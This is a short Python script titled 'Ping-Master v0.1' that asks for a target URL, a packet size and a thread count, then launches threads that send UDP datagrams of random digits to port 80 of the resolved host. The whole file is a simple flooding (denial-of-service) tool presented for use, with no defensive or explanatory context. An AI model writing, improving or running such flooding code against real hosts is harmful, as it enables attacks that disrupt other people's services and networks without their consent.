import time,socket,sys,threading,random
from colorama import Fore
from tqdm import tqdm
print(Fore.GREEN)
def main():
    banner = r"""__________.__                            _____                   __                
    \______   \__| ____    ____             /     \ _____    _______/  |_  ___________ 
     |     ___/  |/    \  / ___\   ______  /  \ /  \\__  \  /  ___/\   __\/ __ \_  __ \
     |    |   |  |   |  \/ /_/  > /_____/ /    Y    \/ __ \_\___ \  |  | \  ___/|  | \/
     |____|   |__|___|  /\___  /          \____|__  (____  /____  > |__|  \___  >__|   
                      \//_____/                   \/     \/     \/            \/       v0.1"""

    class info:
      def __init__(self, url, port,count,byte,banner):
        self.url = url
        self.port = port
        self.count = count
        self.byte = byte
        self.banner = banner


    site = socket.gethostbyname(input("url > ").strip().lower())
    byte = int(input("size(byte) >").strip().lower())
    thread_count = int(input("thread count > ").strip().lower())
    p1 = info(site,80,thread_count,byte,banner)
    print(p1.banner)

    def create(size):
        rnd_msg = ""
        for i in range(0, size):
            ch_rnd = random.choice([0,1,2,3,4,5,6,7,8,9])
            rnd_msg += str(ch_rnd)
        return rnd_msg

    def ping():
        MESSAGE = str.encode(create(p1.byte))
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.sendto(MESSAGE, (p1.url, p1.port))
        


    for i in tqdm(range(p1.count)):
        try:
            threading.Thread(target=ping).start()
            print(str(i)+" packet sended.\n")

        except KeyboardInterrupt:
            sys.exit(0)
    print(Fore.WHITE)

if __name__ == '__main__':
    main() 
